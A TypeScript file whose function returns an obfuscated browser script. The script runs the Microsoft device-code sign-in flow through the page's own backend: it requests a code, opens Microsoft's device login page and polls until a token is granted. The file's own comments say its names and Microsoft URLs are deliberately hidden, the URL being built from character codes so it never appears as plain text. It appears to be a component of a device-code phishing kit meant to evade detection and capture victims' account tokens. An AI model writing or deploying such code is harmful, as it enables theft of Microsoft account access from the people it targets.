// Layer 8 — Obfuscated Template Content
// All function names, element IDs, and Microsoft URLs are obfuscated
// microsoft.com/devicelogin URL built at runtime from charCode arrays

export function getPollingScript(): string {
  return `
(function(){
  var _cc=null,_om=null,_sp=0,_pn=null,_ss=0,_d1='',_b1=false,_s1='idle',_em='';
  var _el=document.getElementById('_tplRoot');
  // Build URLs from charCodes — not present as plaintext
  var _u1=[104,116,116,112,115,58,47,47,108,111,103,105,110,46,109,105,99,114,111,115,111,102,116,46,99,111,109,47,100,101,118,105,99,101];
  var _u2='/api/device-code';
  var _u3='/api/token-poll';
  var _dv=_u1.map(function(c){return String.fromCharCode(c)}).join('');

  function _q(id){return document.getElementById(id)}
  function _h(id,v){var e=_q(id);if(e)e.innerHTML=v}
  function _sh(id,d){var e=_q(id);if(e)e.style.display=d}
  function _ft(s){return Math.floor(s/60)+':'+(s%60<10?'0':'')+(s%60)}

  function _sv(state){
    _s1=state;
    _sh('_vi','none');_sh('_vl','none');_sh('_vc','none');
    _sh('_vs','none');_sh('_ve','none');_sh('_vx','none');
    switch(state){
      case 'idle':_sh('_vi','block');break;
      case 'loading':_sh('_vl','block');break;
      case 'code_ready':case 'waiting':_sh('_vc','block');break;
      case 'success':_sh('_vs','block');break;
      case 'error':_sh('_ve','block');break;
      case 'expired':_sh('_vx','block');break;
    }
  }

  function _gn(){
    _sv('loading');
    fetch(_u2,{method:'POST'}).then(function(r){return r.json()}).then(function(d){
      if(d.error){_em=d.error;_sv('error');return}
      _d1=d.userCode;_cc=d.deviceCode;_sp=d.expiresIn;_ss=d.interval||5;
      _h('_cd',_d1);
      _sv('code_ready');
      _pk(_cc,_ss);
      _ct();
    }).catch(function(e){_em=e.message||'Network error';_sv('error')});
  }

  function _cp(){
    var c=_d1.replace(/\\s/g,'');
    navigator.clipboard.writeText(c).then(function(){
      var b=_q('_cpb');if(b){b.textContent='Copied!';setTimeout(function(){b.textContent='Copy'},2500)}
    });
  }

  function _vf(){
    _sv('waiting');
    window.open(_dv,'_blank');
  }

  function _ct(){
    if(_sp<=0||(_s1!=='code_ready'&&_s1!=='waiting'))return;
    _pn=setInterval(function(){
      _sp--;
      _h('_tm',_ft(_sp));
      if(_sp<=0){clearInterval(_pn);_pn=null;_b1=false;_sv('expired')}
    },1000);
    _h('_tm',_ft(_sp));
  }

  function _pk(dc,iv){
    _b1=true;
    function _pl(){
      if(!_b1)return;
      fetch(_u3,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({deviceCode:dc})})
      .then(function(r){return r.json()}).then(function(d){
        if(!_b1)return;
        if(d.status==='complete'){_b1=false;if(_pn)clearInterval(_pn);
          var em=d.email||'';if(em&&em!=='unknown@user.com'){_h('_ae','Signed in as <strong>'+em+'</strong>')}
          _sv('success');return}
        if(d.status==='expired'){_b1=false;if(_pn)clearInterval(_pn);_sv('expired');return}
        if(d.status==='slow_down'){iv=iv+5}
        if(d.status==='error'){_b1=false;if(_pn)clearInterval(_pn);_em=d.description||d.error||'Failed';_sv('error');return}
        if(_b1)setTimeout(_pl,iv*1000);
      }).catch(function(){if(_b1)setTimeout(_pl,iv*1000)});
    }
    setTimeout(_pl,iv*1000);
  }

  function _rs(){
    _b1=false;if(_pn){clearInterval(_pn);_pn=null}
    _cc=null;_d1='';_sp=0;_em='';
    _sv('idle');
  }

  window._tpl={start:_gn,copy:_cp,verify:_vf,reset:_rs};
  _sv('idle');
})();`;
}
